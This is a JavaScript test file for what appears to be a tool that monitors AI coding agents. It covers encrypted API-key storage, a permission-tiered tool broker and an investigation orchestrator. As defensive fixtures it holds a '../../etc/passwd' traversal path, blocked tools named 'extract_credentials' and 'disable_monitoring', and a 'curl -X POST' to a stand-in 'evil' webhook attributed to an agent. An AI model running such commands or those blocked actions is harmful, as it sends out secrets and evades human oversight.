import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import fs from 'fs';
import path from 'path';
import os from 'os';
import { DatabaseManager } from '../../src/main/db/database.js';
import { CredentialStore } from '../../src/main/ai/credential-store.js';
import { LLMProviderGateway } from '../../src/main/ai/llm-provider-gateway.js';
import { ControlledToolBroker, ToolPermissionTier } from '../../src/main/ai/tool-broker.js';
import { AIOrchestrator } from '../../src/main/ai/orchestrator.js';

describe('Phase 5: AI Reasoning Infrastructure & Orchestrator', () => {
  let db;
  let tmpDir;
  let credStore;
  let gateway;
  let toolBroker;
  let orchestrator;

  beforeEach(() => {
    db = new DatabaseManager(':memory:');
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'aegis-ai-test-'));
    credStore = new CredentialStore(path.join(tmpDir, 'creds.enc'));
    gateway = new LLMProviderGateway({ credentialStore: credStore });
    toolBroker = new ControlledToolBroker({ workspaceRoot: tmpDir, database: db });
    orchestrator = new AIOrchestrator({ database: db, providerGateway: gateway, toolBroker });
  });

  afterEach(() => {
    db.close();
    if (fs.existsSync(tmpDir)) {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  describe('Secure Credential Management', () => {
    it('encrypts and retrieves provider API keys safely', () => {
      credStore.setApiKey('anthropic', 'sk-ant-testkey12345');
      credStore.setApiKey('openai', 'sk-testkey67890');

      expect(credStore.hasApiKey('anthropic')).toBe(true);
      expect(credStore.getApiKey('anthropic')).toBe('sk-ant-testkey12345');
      expect(credStore.getApiKey('openai')).toBe('sk-testkey67890');

      // Verify file is encrypted on disk and does NOT contain plaintext key
      const rawFile = fs.readFileSync(path.join(tmpDir, 'creds.enc'), 'utf8');
      expect(rawFile).not.toContain('sk-ant-testkey12345');

      credStore.removeApiKey('openai');
      expect(credStore.hasApiKey('openai')).toBe(false);
    });
  });

  describe('Controlled Tool Broker', () => {
    it('permits read-only tools within workspace boundary', async () => {
      fs.writeFileSync(path.join(tmpDir, 'README.md'), '# Project Info');
      const content = await toolBroker.executeTool('read_file', { path: 'README.md' });
      expect(content).toBe('# Project Info');
    });

    it('strictly prevents path traversal outside workspace boundary', async () => {
      await expect(
        toolBroker.executeTool('read_file', { path: '../../etc/passwd' })
      ).rejects.toThrow(/escapes workspace boundary/i);
    });

    it('blocks dangerous tools by default', () => {
      const check1 = toolBroker.canExecute('extract_credentials');
      expect(check1.allowed).toBe(false);
      expect(check1.tier).toBe(ToolPermissionTier.BLOCKED);

      const check2 = toolBroker.canExecute('disable_monitoring');
      expect(check2.allowed).toBe(false);
      expect(check2.tier).toBe(ToolPermissionTier.BLOCKED);
    });

    it('requires human approval for file modifications or package installs', () => {
      const check = toolBroker.canExecute('apply_patch');
      expect(check.allowed).toBe(false);
      expect(check.requiresApproval).toBe(true);
      expect(check.tier).toBe(ToolPermissionTier.APPROVAL_REQUIRED);
    });
  });

  describe('AI Orchestrator & Specialist Investigations', () => {
    it('dispatches investigation to specialist agent and records findings', async () => {
      const investigation = await orchestrator.runInvestigation({
        specialistRole: 'SecurityAnalyst',
        question: 'Investigate suspicious curl command to external webhook',
        context: {
          agent: 'claude-code',
          command: 'curl -X POST https://webhook.site/evil',
          triggerType: 'high_risk_event',
        },
      });

      expect(investigation.id).toBeDefined();
      expect(investigation.specialist_role).toContain('Security Analyst');
      expect(investigation.status).toBe('completed');
      expect(investigation.conclusion).toBeDefined();
      expect(investigation.input_tokens).toBeGreaterThan(0);

      // Verify DB persistence
      const investigationsInDb = db.listInvestigations();
      expect(investigationsInDb.length).toBe(1);
      expect(investigationsInDb[0].id).toBe(investigation.id);
      expect(investigationsInDb[0].question).toContain('webhook');
    });
  });
});
